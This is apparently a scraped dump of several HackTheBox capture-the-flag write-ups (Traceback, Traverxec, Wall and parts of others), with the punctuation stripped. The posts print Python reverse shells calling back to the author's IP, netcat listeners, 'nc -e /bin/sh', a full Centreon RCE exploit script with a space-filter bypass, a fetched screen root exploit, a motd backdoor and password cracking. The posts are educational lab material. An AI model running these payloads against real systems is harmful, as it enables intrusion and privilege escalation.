default tmprestic privaterepos users can only access their private repo prometheus enable Prometheus metrics tls turn on TLS support tlscert string TLS certificate path tlskey string TLS key path V version show version and quit We have all the needed informations so lets give a try here First still according to the documentation we need to setup the repository folder bash boltbolt restic init repo tmphg8backup enter password for new repository enter password again created restic repository 14de0bc276 at tmphg8backup Please note that knowledge of your password is required to access the repository Losing your password means that your data is irrecoverably lost Now we can start the restserver with this backup path bash boltbolttmp restserver path hg8backup noauth Data directory registrybackup Authentication disabled Private repositories disabled Starting server on 8000 Sounds all good for the repository Lets now try to backup the root folder to our backup repository using the sudo command we are allowed to run without password bash wwwdatabolt sudo usrbinrestic backup r resthttplocalhost8000 root enter password for repository password is correct scanned 10 directories 14 files in 000 000 10000 28066 KiB 28066 KiB 24 24 items 0 errors ETA 000 duration 000 snapshot 0547cce5 saved 0 errors thats good Now its time to access the file we just backup bash boltbolt restic r tmphg8backup snapshots enter password for repository password is correct ID Date Host Tags Directory 0547cce5 20200128 115115 bolt root 9 snapshots boltbolt restic r tmphg8backup restore 0547cce5 target tmprestoredroot enter password for repository password is correct restoring to tmprestoredroot All that remains to do now is retrieving our flag bash boltbolttmp cat tmprestoredrootrootroottxt ntxxxxxxxxxxxxxxxxxxxxxxxxxxxgw Looking around we can even find the root account private ssh key and use it to obtain a root shell bash boltbolt ssh i tmprestoredrootrootsshidrsa rootregistryhtb Welcome to Ubuntu 18043 LTS GNULinux 415065generic x8664 System information as of Tue Jan 28 115543 UTC 2020 System load 00 Users logged in 1 Usage of 56 of 6180GB IP address for eth0 101010159 Memory usage 26 IP address for docker0 1721701 Swap usage 0 IP address for br1bad9bd75d17 1721801 Processes 173 Last login Mon Oct 21 095348 2019 rootbolt As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Traceback - HackTheBox","tags":["hackthebox","ctf","traceback","webshell","lua","sudo","motd","run-parts"],"href":"/posts/traceback","content":"Traceback was a quite easy box if you are familiar with CTF It exploit particularly a similar misconfiguration we saw previously in the Writeup Boxhttpshg8shpostswriteup I wouldnt recommend it for total beginner since the frequent reset resulting in lot of users working on it and exploit conflicts can be frustrating to progress on TlDr The user flag consist in retrieving and exploiting a webshell planted by a hacker on the webserver of the machine From there you could pivot to another users using a Lua interpreter running as the user needed to pivot to The root flag could be grabbed by exploiting a misconfiguration of etcupdatemotdd folder permissions allowing the user to edit scripts run as root by runparts at login time Alright Lets get into the details now First thing first lets add the box IP to the host file bash hg8archbook echo 101010181 tracebackhtb etchosts and lets start User flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash hg8archbook nmap sV sT sC tracebackhtb Starting Nmap 780 httpsnmaporg at 20200321 2111 CET Nmap scan report for tracebackhtb 101010181 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http Apache httpd 2429 Ubuntu httpserverheader Apache2429 Ubuntu httptitle Help us Service Info OS Linux CPE cpeolinuxlinuxkernel We have the classic A web app running on port 80 and the SSH port 22 open Opening httptracebackhtb display the following website traceback ownedhttpsuserimagesgithubusercontentcom90767477725264775a52a806c5511ea8d0dec4daaa5f7bfpng From what we can see here the website seems to have been hacked The bad guy show off saying he left a backdoor open Thats nice of him If we can find this backdoor we can use it without needing to find an exploit by ourselves Lets try to find more informations When we check the code source of the page we notice an interesting comment html This site has been owned I have left a backdoor for all the net FREE INTERNETZZZ Xh4H Googling Some of the best web shells that you might need return a Github repositoryhttpsgithubcomTheBinitGhimireWebShells with the exact same text as description full of webshell Our hacker used one of those for sure From here we could write a little script that get the shells list on the git repository and to test each shell in the url to find which one if is present on the server but since there is only 15 lets just copy paste by hand We got on the right track opening httptracebackhtbsmevkphp display this login page smevk shell login pagehttpsuserimagesgithubusercontentcom9076747772528953081f8006c5711ea8f0f67a74318d795png Smevk Webshell Checking the shell source codehttpsgithubcomTheBinitGhimireWebShellsblobmastersmevkphp on the previous Github repository informs us that the defaults credentials are adminadmin Lets try smevk shellhttpsuserimagesgithubusercontentcom9076747772529155b6c4c006c5711ea82374d8ff8580f26png Lets try not to focus too much on the design here The shell allow include a command injection tool but its far from being practical The easiest way to progress from here is to open a reverse shell using the web shell We can use for example a Python one 1 Creating and dropping the Python reverse shell bash hg8archbook cat hg8py import socketsubprocessos ssocketsocketsocketAFINETsocketSOCKSTREAM sconnect101010108585 osdup2sfileno0 osdup2sfileno1 osdup2sfileno2 psubprocesscallbinshi hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 Once we have created our reverse shell we can use the Web Shell to upload it to the server sending python reverse shellhttpsuserimagesgithubusercontentcom907674777253164e732a8006c5811ea9659e48e79783f6bpng 2 We then start our listener bash hugoarchpen nc l vv p 8585 Listening on any address 8585 3 And finally launch our reverse shell using the Web Shell python reverse shellhttpsuserimagesgithubusercontentcom907674777253323a12a14006c5911ea8ac4f929aca19150png And we get our connection bash hugoarchpen nc l vv p 8585 Listening on any address 8585 Connection from 10101018158642 binsh 0 cant access tty job control turned off id uid1000webadmin gid1000webadmin groups1000webadmin24cdrom30dip46plugdev111lpadmin112sambashare We now have a shell as webadmin user Lets now do a bit of recon on this user files available on the box bash webadmintraceback ls l home total 8 drwxrx 5 sysadmin sysadmin 4096 Mar 22 0726 sysadmin drwxrx 5 webadmin sysadmin 4096 Mar 16 0403 webadmin webadmintraceback ls homewebadmin notetxt webadmintraceback cat notetxt sysadmin I have left a tool to practice Lua Im sure you know where to find it Contact me if you have any question Alright we have a little more information here We will need to pivot to sysadmin user and this one gave left a note leading to a tool about practice Lua Pivot webadmin sysadmin Since we dont know where is the tool to practice Lua that sysadmin talk about lets continue our classic recon process for the moment When checking for informations on sudo we stumble upon something interesting bash webadmintraceback sudo l Matching Defaults entries for webadmin on traceback envreset mailbadpass securepathusrlocalsbinusrlocalbinusrsbinusrbinsbinbinsnapbin User webadmin may run the following commands on traceback sysadmin NOPASSWD homesysadminluvit We can run the following command homesysadminluvit as sysadmin without having to use password Lets open this luveit to see what is it about bash webadmintraceback sudo u sysadmin homesysadminluvit Welcome to the Luvit repl According to Luvitio website Luvit implements the same APIs as Nodejs but in Lua This helps teams migrate without having to learn a new way of programming So if I understand correctly its a Lua interpreter including the same APIs as Nodejs Since its able to run Lua and Nodejs as sysadmin it very possible we have write abilities on sysadmin home folder And we know that arbitrary file write definitely lead to privilege escalation A common approach to privilege escalation using file write is to add our public SSH key to the sshauthorizedkeys file In Lua this would give something like this lua file ioopenhomesysadminsshauthorizedkeys a filewritesshrsa AAAXXXXXXXXXXXXXXXXXXXXXXXXXXXXXLmWQ hg8hg8sh fileclose Note Dont forget to open the authorizedkeys file in append mode a to not overwrite the actual config or the keys of other players that potentially used the same trick Lets run it to check if it works as intended bash webadmintraceback sudo u sysadmin homesysadminluvit tmphg8lua webadmintraceback No error lets now try to login to sysadmin account using the SSH key we just authorized bash hg8archbook ssh i idrsa sysadmintracebackhtb OWNED BY XH4H I guess stuff could have been configured better Welcome to Xh4H land Last login Mon Mar 16 035024 2020 from 1010142 sysadmintraceback id uid1001sysadmin gid1001sysadmin groups1001sysadmin sysadmintraceback ls luvit usertxt sysadmintraceback cat usertxt 3xxxxxxxxxxxxxxxxxxxxxxxb Root Flag Recon The first thing we notice when login to sysadmin account is that our hacker didnt only drop a webshell on the server but also modified a few files For example this custom message on login time OWNED BY XH4H I guess stuff could have been configured better Welcome to Xh4H land Lets search on the system for xh4h to see if our hacker dropped some interesting other files bash sysadmintraceback grep ri xh4h 2devnull etcupdatemotdd00headerecho nWelcome to Xh4H land n varwwwhtmlindexhtml Xh4H varbackupsupdatemotdd00headerecho nWelcome to Xh4H land n Seems like nothing else to see Lets focus on this 00header in updatemotdd folder For those who are unfamiliar with motd here is a reminder of what it does The contents of etcmotd are displayed by pammotd8 after a successful login but just before it executes the login shell The abbreviation motd stands for message of the day and this file has been traditionally used for exactly that it requires much less disk space than mail to all users Lets see what we have on this server updatemotdd bash sysadmintracebacketcupdatemotdd ls l total 24 rwxrwxrx 1 root sysadmin 981 Mar 22 0937 00header rwxrwxrx 1 root sysadmin 982 Mar 22 0937 10helptext rwxrwxrx 1 root sysadmin 4264 Mar 22 0937 50motdnews rwxrwxrx 1 root sysadmin 604 Mar 22 0937 80esm rwxrwxrx 1 root sysadmin 299 Mar 22 0937 91releaseupgrade First thing that catch the eye here is that all those file belong to sysadmin group meaning we as sysadmin user can read write and execute them even though we are not the owner Alright now how are those files executed to end up being displayed at login time If you are familiar with Debian you may know about the runparts utility runparts run scripts or programs in a directory runparts will run all the scripts in a given directory Its very useful in a lot of scenario For example its used in Debian to dynamically generate a Message Of Day MOTD by combining all the output of scripts present in etcupdatemotdd folder like so bash runparts etcupdatemotdd And this is done at login time as root See whats the issue is here We are able to edit file that are going to be run as root Lets now use this knowledge to escalate our privileges to root Exploiting runparts and motd To exploit this misconfiguration we are going to open a reverse shell as root First lets open out netcat listener bash hugoarchpen nc l vv p 8585 Listening on any address 8585 Then lets edit for example 00header to add a command to open our reverse shell bash echo python tmptmphg8py 00header Now next time we login our reverse shell will be executed as root Lets give it a try by login out of SSH and login in again bash hugoarchpen ssh i idrsa sysadmintracebackhtb OWNED BY XH4H I guess stuff could have been configured better Welcome to Xh4H land At this moment our connection open bash hugoarchpen nc l vv p 8585 Listening on any address 8585 Connection from 10101018160494 cat rootroottxt 4xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx9 As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Traverxec - HackTheBox","tags":["hackthebox","ctf","traverxec","nhttpd","nostromo","Directory Transversal","CVE-2019-16278","john","journalctl","less","GTFOBins"],"href":"/posts/traverxec","content":"Traverxec was in my opinion a particular and interesting box While being rated easy it still teach me a little trick and got me very frustrated at some point because it was super easy to overlook and overthink easy things Still it was worth cogitate on it TlDr The user flag was accessible after using a Remote Code Execution exploit on the nhttpd web server running giving us access to the wwwdata user From here you were able to enter the user home directory and access to a backup archive containing its SSH private key After bruteforcing the passphrase you could connect to the user account and grab the flag The root flag consisted in exploiting a misconfiguration in sudo config allowing to view journalctl entries as root without password Since journalctl use less as a pager it was possible to break out from less running as root by spawning an interactive system shell Alright Lets get into the details now First thing first lets add the box IP to the hosts file bash hg8archbook echo 101010165 traverxechtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan to see which ports are open on the box bash hg8archbook nmap sV sT sC traverxechtb Starting Nmap 780 httpsnmaporg at 20191118 1536 CET Nmap scan report for traverxechtb 101010165 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 79p1 Debian 10deb10u1 protocol 20 80tcp open http nostromo 196 Service Info OS Linux CPE cpeolinuxlinuxkernel We have something super classical A HTTP port 80 and SSH port 22 service open But in this result something immediately catch the eye nostromo 196 Thats a really not common web server According to its documentationhttpswwwgspcomcgibinmancgisection8topicnhttpd nhttpd is a simple fast and secure HTTP server It runs as a single process handling connections with select2 And actually while searching for informations about this web server out of curiosity the second result on Google was about a RCE vulnerability through directory transversal on version david Looking around we find the configuration of the nostromo web server hopefully we can find juicy informations there bash wwwdatatraverxec cat varnostromoconfnhttpdconf MAIN MANDATORY servername traverxechtb serverlisten serveradmin davidtraverxechtb serverroot varnostromo servermimes confmimes docroot varnostromohtdocs docindex indexhtml LOGS OPTIONAL logpid logsnhttpdpid SETUID RECOMMENDED user wwwdata BASIC AUTHENTICATION OPTIONAL htaccess htaccess htpasswd varnostromoconfhtpasswd ALIASES OPTIONAL icons varnostromoicons HOMEDIRS OPTIONAL homedirs home homedirspublic publicwww The configuration gives the path to an htpasswd file bash wwwdatatraverxec cat varnostromoconfhtpasswd david1e7NfNpNiA6nCwOTqrNR2oDuIKirRZ Maybe if we bruteforce the password of this htpasswd file we can reuse the found password to login as david to ssh Lets give it a try bash hg8archbook echo 1e7NfNpNiA6nCwOTqrNR2oDuIKirRZ davidhash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt davidhash Loaded 1 password hash md5crypt crypt3 1 and variants MD5 128128 AVX 4x3 Will run 2 OpenMP threads Nowonly4me Session completed Alright We managed to get the password Thats a good news and a nice step Lets try to login as david now bash hg8archbook ssh davidtraverxechtb davidtraverxechtbs password Permission denied please try again No luck su david maybe bash wwwdatatraverxec su david Password su Authentication failure wwwdatatraverxec Nop Looks like a dead end here Lets go back at the beginning to make sure we didnt miss anything First lets check again the nhttpdconf file bash wwwdatatraverxecvarnostromoconf cat nhttpdconf HOMEDIRS OPTIONAL homedirs home homedirspublic publicwww This HOMEDIRS option catch my eye does that mean we could access david home directory using the webserver Lets check the documentation bash wwwdatatraverxec man nhttpd HOMEDIRS To serve the home directories of your users via HTTP enable the homedirs option by defining the path in where the home directories are stored normally home To access a users home directory enter a in the URL followed by the home directory name like in this example httpwwwnazgulchhacki The content of the home directory is handled exactly the same way as a directory in your document root If some users dont want that their home directory can be accessed via HTTP they shall remove the world readable flag on their home directory and a caller will receive a 403 Forbidden response Also if basic authentication is enabled a user can create an htaccess file in his home directory and a caller will need to authenticate You can restrict the access within the home directories to a single sub directory by defining it via the homedirspublic option Thats interesting Ok so we know our user is David can we access his homedir http hg8archbook curl httptraverxechtbdavid Private spaceNothing here Keep out Nothing to see here Thats true and running gobuster wont help either We need to find a way to list files and directories in david homedir but how And this is where I got frustrated After searching for a while I realized I overlooked something obvious Lets check again the permissions of david homedir bash wwwdatatraverxec ls l homedavid ls cannot open directory homedavid Permission denied wwwdatatraverxec ls l home total 4 drwxxx 5 david david 4096 Dec 22 1215 david We indeed have no read nor write permissions but we do have execute bit is set x For a binary the x bit mean the file can be executed But for directory what does it mean then The execute bit x allows the affected user to enter the directory and access files and directories inside So we can not read nor write david homedir but we can enter it Lets give a try bash wwwdatatraverxec cd homedavidpublicwww cd homedavidpublicwww wwwdatatraverxechomedavidpublicwww ls l ls l total 8 rwrr 1 david david 402 Oct 25 1545 indexhtml drwxrxrx 2 david david 4096 Oct 25 1702 protectedfilearea It worked Once inside we notice another interesting folder protectedfilearea Lets see whats it bash wwwdatatraverxechomedavidpublicwwwprotectedfilearea ls backupsshidentityfilestgz A backup of ssh identity files This sure looks promising Lets extract it bash wwwdatatraverxechomedavidpublicwwwprotectedfilearea mkdir tmptmp wwwdatatraverxechomedavidpublicwwwprotectedfilearea tar xzf backupsshidentityfilestgz C tmptmp wwwdatatraverxechomedavidpublicwwwprotectedfilearea cd tmptmphomedavid wwwdatatraverxectmptmphomedavid ls la ssh rwrr 1 wwwdata wwwdata 397 Oct 25 1702 authorizedkeys rw 1 wwwdata wwwdata 1766 Oct 25 1702 idrsa rwrr 1 wwwdata wwwdata 397 Oct 25 1702 idrsapub Jackpot We can now try to use this ssh key to access david account bash hg8archbook ssh i idrsa davidtraverxechtb Enter passphrase for key idrsa It couldnt have been this easy right A passphrase is needed for this ssh key Lets fire john to see if we can bruteforce the passphrase bash hg8archbook ssh2john idrsa idrsahash hg8archbook john wordlistSecListsPasswordsLeakedDatabasesrockyoutxt idrsahash Loaded 1 password hash SSH RSADSAECOPENSSH SSH private keys 3264 Press q or CtrlC to abort almost any other key for status hunter sshidrsa Warning Only 1 candidate left minimum 2 needed for performance 1g 0000012 DONE 20191118 1106 008012gs 1149Kps 1149Kcs 1149KCs 7Vamos Session completed john found hunter as a passphrase We have all the pieces to login now bash hg8archbook ssh i idrsa davidtraverxechtb Enter passphrase for key idrsa Linux traverxec 41906amd64 1 SMP Debian 419672deb10u1 20190920 x8664 davidtraverxec cat usertxt 7xxxxxxxxxxxxxxxxxxxxxd Root Flag Recon First thing first lets check whats inside david home directory bash davidtraverxec ls l total 12 drwx 2 david david 4096 Dec 22 1241 bin drwxrxrx 3 david david 4096 Oct 25 1545 publicwww rr 1 root david 33 Oct 25 1614 usertxt davidtraverxec ls l bin total 8 r 1 david david 802 Oct 25 1626 serverstatshead rwx 1 david david 363 Oct 25 1626 serverstatssh Lets first focus on the bin folder and serverstatssh script bash davidtraverxecbin cat serverstatssh binbash cat homedavidbinserverstatshead echo Load usrbinuptime echo echo Open nhttpd sockets usrbinss H sport 80 usrbinwc l echo Files in the docroot usrbinfind varnostromohtdocs usrbinwc l echo echo Last 5 journal log lines usrbinsudo usrbinjournalctl n5 unostromoservice usrbincat The line about journalctl looks particularly interesting since its used with sudo command without password If we can abuse this journalctl command we can potentially escalate our privileges to root The best resource for finding example of abusing legitimate binaries is GTFOBinshttpsgtfobinsgithubio GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions The project collects legitimate functions of Unix binaries that can be abused to break out restricted shells escalate or maintain elevated privileges transfer files spawn bind and reverse shells and facilitate the other postexploitation tasks According to it journalctl can be used to elevate privileges thanks to the pager used less Less can be used to break out from restricted environments by spawning an interactive system shell Lets give it a try bash davidtraverxecbin usrbinsudo usrbinjournalctl n5 unostromoservice Logs begin at Mon 20191118 070054 EST end at Mon 20191118 Nov 18 070058 traverxec systemd1 Starting nostromo nhttpd serv Nov 18 070058 traverxec systemd1 nostromoservice Cant open Nov 18 070058 traverxec nhttpd477 started Nov 18 070058 traverxec nhttpd477 max file descriptors 1040 Nov 18 070058 traverxec systemd1 Started nostromo nhttpd serve binsh bash roottraverxechomedavidbin cd roottraverxec ls nostromo1961deb roottxt roottraverxec cat roottxt 9xxxxxxxxxxxxxxxxx6 Now that we are root and done lets not forget to clean up our changes to not spoil other users Additional notes I will put here a few additional information about this box that could be useful to others htpassw bruteforce As you could have noticed in the user flag recon part a htpasswd if available this one is used to restrict access to the protectedfilearea folder in david homedir basic auth traverxechttpsuserimagesgithubusercontentcom9076747713254536e9f3c8024ed11ea85073c758091d65cpng It was possible to bruteforce this htpasswd file even if it was not needed to solve the box Here how to do it using the good old john bash wwwdatatraverxec cat varnostromoconfhtpasswd david1e7NfNpNiA6nCwOTqrNR2oDuIKirRZ bash hg8archbook echo david1e7NfNpNiA6nCwOTqrNR2oDuIKirRZ davidhash hg8archbook john wordlisthomehugoSecListsPasswordsLeakedDatabasesrockyoutxt davidhash Loaded 1 password hash md5crypt crypt3 1 and variants MD5 128128 AVX 4x3 Press q or CtrlC to abort almost any other key for status Nowonly4me 1g 0000135 DONE 20191117 1928 001052gs 111325ps 111325cs 111325Cs NoyooNovemberRain Session completed hg8archbook john show davidhash davidNowonly4me Lets now try to access the protectedfilearea using those credentials david homedir htaccesshttpsuserimagesgithubusercontentcom907674771325488f4bb830024ed11ea9885e4ef90f7d370png Success Thats it folks As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Wall - HackTheBox","tags":["hackthebox","ctf","wall","gobuster","wfuzz","centreon","cve-2019-13024","waf","filter","screen"],"href":"/posts/wall","content":"Wall was an interesting box exploit oriented The initial foothold was not straight forward to find and took a bit of time to finally figure out First thing first lets add the box IP to the hosts file bash hg8archbook echo 101010157 wallhtb etchosts and lets start User Flag Recon Lets start with the classic nmap scan bash hg8archbook nmap sV sT sC wallhtb Starting Nmap 780 httpsnmaporg at 20191028 1625 CET Nmap scan report for wallhtb 101010157 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 76p1 Ubuntu 4ubuntu03 Ubuntu Linux protocol 20 80tcp open http Apache httpd 2429 Ubuntu httpserverheader Apache2429 Ubuntu httptitle Apache2 Ubuntu Default Page It works Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 1337 seconds We have a classical web app running on port 80 and the ssh port 22 open Opening httpwallhtb display the Apache2 Ubuntu Default Page as nmap told us Wall websitehttpsuserimagesgithubusercontentcom9076747676931548bae0800f9a111e9995db2fb18a8a970png The source code of the page do not reveal any sneaky hidden code so lets move on We launch gobuster to see if we can find interresting files andor directories bash hg8archbook gobuster dir u httpwallhtb w SecListsDiscoveryWebContentbigtxt x php Gobuster v301 by OJ Reeves TheColonial Christian Mehlmauer FireFart htaccess Status 403 htaccessphp Status 403 htpasswd Status 403 htpasswdphp Status 403 aaphp Status 200 monitoring Status 401 panelphp Status 200 serverstatus Status 403 20191028 163957 Finished Two files looks interesting here aaphp and panelphp bash hg8archbook http wallhtbaaphp HTTP11 200 OK Connection KeepAlive ContentLength 1 ContentType texthtml charsetUTF8 Date Mon 28 Oct 2019 154845 GMT KeepAlive timeout5 max100 Server Apache2429 Ubuntu 1 hg8archbook http wallhtbpanelphp HTTP11 200 OK Connection KeepAlive ContentLength 26 ContentType texthtml charsetUTF8 Date Mon 28 Oct 2019 154913 GMT KeepAlive timeout5 max100 Server Apache2429 Ubuntu Just a test for php file Hum we do not have too much informations here monitoring and serverstatus prompt Basic Auth From here we didnt make a lot of progress Trying to bruteforce the Basic Auth of monitoring and serverstatus doesnt gives results We dont even have any particular informations on the two php files After getting into rabbit holes for a few times I decided to try different HTTP Method on the php endpoints with a simple command bash hg8archbook for method in GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT do echo nmethod curl X method httpwallhtbaaphp done No interresting results neither on panelphp Out of despair I decide to try on the monitoring endpoint And finally bash hg8archbook for method in GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT do echo nmethod curl X method httpwallhtbmonitoring done POST This page is not ready yet We should redirect you to the required page Interresting the centreon endpoint slipped from the gobuster enumeration Maybe a bigger wordlist might have discovered it For future references I add this endpoint to the wordlist I use the most bash hg8archbook echo centreon SecListsDiscoveryWebContentbigtxt We got our initial foothold Opening the page show the classical Centreon login page Wall Centreon login pagehttpsuserimagesgithubusercontentcom907674767695628ab472f80f9a511e980473febc7e9a9a9png For reference Centreon is a network system applicative supervision and monitoring tool httpswwwcentreoncom The login page display the version number v 19040 Searching for exploits on this version we found a Remote Code Execution vulnerability bash hg8archbook getsploit centreon Total found exploits 10 Websearch URL httpsvulnerscomsearchquerybulletinFamily3AexploitANDcentreon Centreon 1904 Remote Code httpsvulnerscomexploitdbEDBID47069 Unfortunately this is a Authenticated RCE and we have no way to bypass authentication Since we dont have any clues lets try to bruteforce with user admin To avoid the struggle of centreon token on the login page we will use the Centreon API instead The documentation is available on the Centreon documentationhttpsdocumentationcentreoncomdocscentreonen1904apiapirestindexhtmlauthentication I like to use ProbableWordlistshttpsgithubcomberzerk0ProbableWordlists instead of the classic rockyoutxt that countains too much garbages bash hg8archbook wget httpsrawgithubusercontentcomberzerk0ProbableWordlistsmasterRealPasswordsTop304Thousandprobablev2txt 20191028 173852 154 MBs Top304Thousandprobablev2txt saved 28110122811012 hg8archbook wfuzz z fileTop304Thousandprobablev2txt d usernameadminpasswordFUZZ hc 403 httpwallhtbcentreonapiindexphpactionauthenticate Wfuzz 241 The Web Fuzzer Target httpwallhtbcentreonapiindexphpactionauthenticate Total requests 303872 ID Response Lines Word Chars Payload 000000048 200 0 L 1 W 61 Ch password1 C We now have the credentials lets login and try to execute the exploit The exploit author wrote a blog posthttpsshellssystemscentreonv1904remotecodeexecutioncve201913024 explaining in detail the issue and how the exploit work Its a very useful ressource to tweak the exploit to make it working on this box I had to tweak a few lines to make it work it work properly on that box my final script was python usrbinpython import requests import sys import warnings from bs4 import BeautifulSoup warningsfilterwarningsignore categoryUserWarning modulebs4 url httpwallhtbcentreon username admin password password1 ip 10101010 port 8585 command sysargv1 request requestssession print Retrieving CSRF token to submit the login form page requestgeturlindexphp htmlcontent pagetext soup BeautifulSouphtmlcontent featureshtmlparser token soupfindAllinput3getvalue logininfo useralias username password password submitLogin Connect centreontoken token loginrequest requestposturlindexphp logininfo print Login token is 0formattoken if Your credentials are incorrect not in loginrequesttext print Logged In print Retrieving Poller token pollerconfigurationpage url maingetphpp60901 getpollertoken requestgetpollerconfigurationpage pollerhtml getpollertokentext pollersoup BeautifulSouppollerhtml featureshtmlparser pollertoken pollersoupfindAllinput25getvalue print Poller token is 0formatpollertoken payloadinfo name Central66 nsipaddress 127001 localhostlocalhost 1 isdefaultisdefault 0 remoteid sshport 22 initscript centengine nagiosbin command nagiostatsbin usrsbincentenginestats nagiosperfdata varlogcentreonengineserviceperfdata centreonbrokercfgpath etccentreonbroker centreonbrokermodulepath usrsharecentreonlibcentreonbroker centreonbrokerlogspath centreonconnectorpath usrlib64centreonconnector initscriptcentreontrapd centreontrapd snmptrapdpathconf etcsnmpcentreontraps nsactivatensactivate 1 submitC Save id 1 o c centreontoken pollertoken sendpayload requestpostpollerconfigurationpage payloadinfo printsendpayloadtext print Injecting Done generatexmlpage url includeconfigurationconfigGeneratexmlgenerateFilesphp xmlpagedata poller 1 debug true generate true r requestpostgeneratexmlpage xmlpagedata else print Wrong credentials exit The exploit takes one argument which is the command we want to run Lets try to run a netcat reverse shell bash hg8archbook python exploitpy nc e binsh 10001 8585 Retrieving CSRF token to submit the login form Login token is b4710792d09b371b03c9ef6d3bbf3f26 Logged In Retrieving Poller token Poller token is c7f63cd8143107496edfdb8ac304b5ca 403 Forbidden Forbidden You dont have permission to access centreonmaingetphp on this server Apache2429 Ubuntu Server at wallhtb Port 80 Injecting Done Hum we get stuck with Forbidden Seems like a WAF web application firewall is in place probably the why the box name is Wall When we send a simple test command like test the injection succeed Lets try to send a few special char we had in our netcat command to find which one exactly is filtered bash hg8archbook python exploitpy Retrieving CSRF token to submit the login form Login token is b4710792d09b371b03c9ef6d3bbf3f26 Logged In Retrieving Poller token Poller token is c7f63cd8143107496edfdb8ac304b5ca Injecting Done No blocking this time So what remains The space of course Lets give it a try bash hg8archbook python exploitpy test test Retrieving CSRF token to submit the login form Login token is b4710792d09b371b03c9ef6d3bbf3f26 Logged In Retrieving Poller token Poller token is c7f63cd8143107496edfdb8ac304b5ca 403 Forbidden Forbidden You dont have permission to access centreonmaingetphp on this server Apache2429 Ubuntu Server at wallhtb Port 80 Injecting Done So now we have to find a solution to use command without spaces Searching a bit online we find that its possible to use the Internal field separatorhttpsenwikipediaorgwikiInternalfieldseparator The shell treats each character of IFS as a delimiter and splits the results of the other expansions into words on these characters Lets give it try bash hg8archbook echoIFStest hg8archbook Unfortunately this doesnt seems to work but using the brackets works bash hg8archbook echoIFStest test Lets try edit our exploit to replace spaces with the IFS diff command sysargv1 command commandreplace IFS This time we are going to open a local web server to have feedback on wether our command injection worked on not In a new terminal lets open a python simple http server bash hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 And lets run our exploit again bash hg8archbook python exploitpy wget 101010108000hg8py O tmphg8py Retrieving CSRF token to submit the login form Login token is 56855cc04ceb87148ce7d83c4b90bd9e Logged In Retrieving Poller token Poller token is 7b642628745280f86fc6100f43fd7ad9 Injecting Done And on our web server we see a new entry bash hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 10101010 29Oct2019 132927 GET hg8py HTTP11 200 The hg8py countains a python reverse shell python import socketsubprocessosssocketsocketsocketAFINETsocketSOCKSTREAMsconnect100018585osdup2sfileno0 osdup2sfileno1 osdup2sfileno2psubprocesscallbinshi Since we managed to write it to the server lets run it now We first open our nc listener bash hg8archbook nc l vv p 8585 Listening on any address 8585 And run the exploit again bash hg8archbook python exploitpy python tmphg8py Retrieving CSRF token to submit the login form Login token is b4710792d09b371b03c9ef6d3bbf3f26 Logged In Retrieving Poller token Poller token is c7f63cd8143107496edfdb8ac304b5ca Injecting Done And the shell open in our reverse shell bash hg8archbook nc l vv p 8585 Listening on any address 8585 Connection from 10101015750472 binsh 0 cant access tty job control turned off id uid33wwwdata gid33wwwdata groups33wwwdata6000centreon We got our first shell Time to move onto the user flag Lets enumerate what we have here bash ls l home total 8 drwxrxrx 6 shelby shelby 4096 Jul 30 1737 shelby drwxrxrx 5 sysmonitor sysmonitor 4096 Jul 6 1507 sysmonitor find perm us type f 2devnull binscreen450 Interresting I always run a search for binaries with setuid bit enabled first and this returned screen in version 450 As a reminder Binaries with the setuid bit enabled are being executed as if they were running under the context of the root user This enables normal nonprivileged users to use special privileges like opening sockets While this seems unnecessary for a normal user it is actually needed for simple commands like ping After a bit of search we stumbled upon a bughttpslistsgnuorgarchivehtmlscreendevel201701msg00025html that allows to privilege escalte to root with screen 450 and setuid bit set Lets give it a try bash hg8archbook wget httpsrawgithubusercontentcomXiphosResearchexploitsmasterscreen2rootscreenrootsh 20191029 145915 483 MBs screenrootsh saved 11521152 hg8archbook python m httpserver Serving HTTP on 0000 port 8000 http00008000 wwwdataWalltmp wget 100018000screenrootsh 20191029 145958 832 MBs screenrootsh saved 11521152 wwwdataWalltmp bash screenrootsh gnuscreenroot First we create our shell and library Now we create our etcldsopreload file Triggering from etcldsopreload cannot be preloaded cannot open shared object file ignored done No Sockets found in tmpscreensSwwwdata id uid0root gid0root groups0root33wwwdata6000centreon We got our root shell We skipped the pivot to user part if there was any but we can now access easily to both flags bash cat homeshelbyusertxt fe6194544f45xxxxx5b12f8da8406 cat rootroottxt 1fdbcf8c33exxxxxx2e1b4d5db7 Later I will give this box another try to pivot correctly to the shelby user if its possible and update this writeup EDIT Here how the pivot was possible https0xdfgitlabio20191207htbwallhtmlprivwwwdatashelby As always do not hesitate to contact me for any questions or feedbacks See you next time hg8"},{"title":"Writeup - HackTheBox","tags":["hackthebox","ctf","cmsms","sqli","run-parts","exploit","injection"],"href":"/posts/writeup","content":"Writeup was my first machine I solved to start my CTF journey Its an easy rated box but still interesting and perfect to jump into the CTF bath User Flag Recon Lets start with the classic nmap bash hg8archbook nmap sV sT sC writeuphtb Starting Nmap 770 httpsnmaporg at 20190901 1039 CEST Nmap scan report for writeuphtb 101010138 PORT STATE SERVICE VERSION 22tcp open ssh OpenSSH 74p1 Debian 10deb9u6 protocol 20 80tcp open http Apache httpd 2425 Debian httprobotstxt 1 disallowed entry writeup httpserverheader Apache2425 Debian httptitle Nothing here yet Service Info OS Linux CPE cpeolinuxlinuxkernel Nmap done 1 IP address 1 host up scanned in 3223 seconds A classic port 80 and 22 nmap did a bit extra work for us and found the the robotstxt show an interesting entry writeup First thing we see when opening the 80 port is this 